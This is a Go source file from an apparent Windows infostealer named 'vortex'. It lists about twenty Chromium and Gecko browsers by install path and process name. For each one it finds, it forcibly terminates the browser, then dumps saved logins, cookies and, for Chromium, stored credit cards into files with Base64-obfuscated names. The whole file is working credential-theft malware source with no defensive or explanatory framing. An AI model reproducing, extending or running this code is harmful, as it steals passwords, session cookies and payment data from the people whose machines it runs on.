//go:build windows

package browser

import (
	"errors"
	"os"
	"path/filepath"
	"time"
	"vortex/encrypt"
	"vortex/hutil"
)

type BrowsersInfo struct {
	BrowserName string
	ProcessName string
	MainPath    string
}

func RecursiveChromiumBrowserDump(mainFolder string) {
	var (
		localStatePath         string = filepath.Join("User Data", "Local State")
		loginDataPath          string = filepath.Join("User Data", "Default", "Login Data")
		cookiesNetworkDataPath string = filepath.Join("User Data", "Default", "Network", "Cookies")
		cookiesDataPath        string = filepath.Join("User Data", "Default", "Cookies")
		creditCardsDataPath    string = filepath.Join("User Data", "Default", "Web Data")
		err                    error
	)
	browsersInfo := []BrowsersInfo{
		{BrowserName: "7Star", ProcessName: "7star.exe", MainPath: filepath.Join(os.Getenv("LOCALAPPDATA"), "7Star", "7Star")},
		{BrowserName: "Cent", ProcessName: "chrome.exe", MainPath: filepath.Join(os.Getenv("LOCALAPPDATA"), "CentBrowser")},
		{BrowserName: "Chrome", ProcessName: "chrome.exe", MainPath: filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome")},
		{BrowserName: "Chromium", ProcessName: "chromium.exe", MainPath: filepath.Join(os.Getenv("LOCALAPPDATA"), "Chromium")},
		{BrowserName: "Edge", ProcessName: "msedge.exe", MainPath: filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge")},
		{BrowserName: "QQBrowser", ProcessName: "QQBrowser.exe", MainPath: filepath.Join(os.Getenv("LOCALAPPDATA"), "Tencent", "QQBrowser")},
		{BrowserName: "Opera", ProcessName: "", MainPath: filepath.Join(os.Getenv("LOCALAPPDATA"), "Opera Software", "Opera Stable")},
		{BrowserName: "OperaNeon", ProcessName: "", MainPath: filepath.Join(os.Getenv("LOCALAPPDATA"), "Opera Software", "Opera Neon")},
		{BrowserName: "Amigo", ProcessName: "amigo.exe", MainPath: filepath.Join(os.Getenv("LOCALAPPDATA"), "Amigo")},
		{BrowserName: "Chedot", ProcessName: "chedot.exe", MainPath: filepath.Join(os.Getenv("LOCALAPPDATA"), "Chedot")},
		{BrowserName: "Brave", ProcessName: "brave.exe", MainPath: filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser")},
		{BrowserName: "ComodoDragon", ProcessName: "dragon.exe", MainPath: filepath.Join(os.Getenv("LOCALAPPDATA"), "Comodo", "Dragon")},
		{BrowserName: "CocCoc", ProcessName: "browser.exe", MainPath: filepath.Join(os.Getenv("LOCALAPPDATA"), "CocCoc", "Browser")},
		{BrowserName: "AVGBrowser", ProcessName: "AVGBrowser.exe", MainPath: filepath.Join(os.Getenv("LOCALAPPDATA"), "AVG", "Browser")},
		{BrowserName: "Slimjet", ProcessName: "slimjet.exe", MainPath: filepath.Join(os.Getenv("LOCALAPPDATA"), "Slimjet")},
		{BrowserName: "Sputnik", ProcessName: "sputnik.exe", MainPath: filepath.Join(os.Getenv("LOCALAPPDATA"), "Sputnik")},
		{BrowserName: "Vivaldi", ProcessName: "vivaldi.exe", MainPath: filepath.Join(os.Getenv("LOCALAPPDATA"), "Vivaldi")},
	}

	for i := range browsersInfo {
		var cookiesPath string
		if _, err = os.Stat(browsersInfo[i].MainPath); err != nil {
			continue
		}

		hutil.TerminateProcess(browsersInfo[i].ProcessName)
		time.Sleep(1 * time.Second)

		if _, err = os.Stat(filepath.Join(browsersInfo[i].MainPath, cookiesNetworkDataPath)); os.IsNotExist(err) {
			cookiesPath = filepath.Join(browsersInfo[i].MainPath, cookiesDataPath)
		} else {
			cookiesPath = filepath.Join(browsersInfo[i].MainPath, cookiesNetworkDataPath)
		}

		if err = dumpChromiumBasedCookies(mainFolder, cookiesPath, filepath.Join(browsersInfo[i].MainPath, localStatePath), encrypt.B64Util(browsersInfo[i].BrowserName+"-ck.txt", 0)); err != nil {
			hutil.LogTrace(mainFolder, errors.New(browsersInfo[i].BrowserName+": "+err.Error()))
		}

		if err = dumpChromiumLoginData(mainFolder, filepath.Join(browsersInfo[i].MainPath, loginDataPath), filepath.Join(browsersInfo[i].MainPath, localStatePath), encrypt.B64Util(browsersInfo[i].BrowserName+"-dl.txt", 0)); err != nil {
			hutil.LogTrace(mainFolder, errors.New(browsersInfo[i].BrowserName+": "+err.Error()))
		}

		if err = dumpChromiumBasedCreditCards(mainFolder, filepath.Join(browsersInfo[i].MainPath, creditCardsDataPath), filepath.Join(browsersInfo[i].MainPath, localStatePath), encrypt.B64Util(browsersInfo[i].BrowserName+"-cc.txt", 0)); err != nil {
			hutil.LogTrace(mainFolder, errors.New(browsersInfo[i].BrowserName+": "+err.Error()))
		}

	}
}

func RecursiveGeckoBrowserDump(mainFolder string) {
	browsersInfo := []BrowsersInfo{
		{BrowserName: "Firefox", ProcessName: "firefox.exe", MainPath: filepath.Join(os.Getenv("APPDATA"), "Mozilla", "Firefox")},
		{BrowserName: "Waterfox", ProcessName: "waterfox.exe", MainPath: filepath.Join(os.Getenv("APPDATA"), "Waterfox")},
		{BrowserName: "Palemoon", ProcessName: "palemoon.exe", MainPath: filepath.Join(os.Getenv("APPDATA"), "Moonchild Productions", "Pale Moon")},
		{BrowserName: "Icecat", ProcessName: "icecat.exe", MainPath: filepath.Join(os.Getenv("APPDATA"), "Mozilla", "icecat")},
	}

	for i := range browsersInfo {
		if _, err := os.Stat(browsersInfo[i].MainPath); err != nil {
			continue
		}

		hutil.TerminateProcess(browsersInfo[i].ProcessName)
		time.Sleep(1 * time.Second)

		activeProfile, err := getActiveProfilePath(filepath.Join(browsersInfo[i].MainPath, "Profiles"))
		if err != nil {
			hutil.LogTrace(mainFolder, errors.New(browsersInfo[i].BrowserName+": "+err.Error()))
		}

		var (
			key4Path    string = filepath.Join(activeProfile, "key4.db")
			dataPath    string = filepath.Join(activeProfile, "logins.json")
			cookiesPath string = filepath.Join(activeProfile, "cookies.sqlite")
		)

		if err = dumpGeckoBasedLoginData(mainFolder, key4Path, dataPath, encrypt.B64Util(browsersInfo[i].BrowserName+"-dl.txt", 0)); err != nil {
			hutil.LogTrace(mainFolder, errors.New(browsersInfo[i].BrowserName+": "+err.Error()))
		}

		if err = dumpGeckoBasedCookies(mainFolder, cookiesPath, encrypt.B64Util(browsersInfo[i].BrowserName+"-ck.txt", 0)); err != nil {
			hutil.LogTrace(mainFolder, errors.New(browsersInfo[i].BrowserName+": "+err.Error()))
		}
	}
}
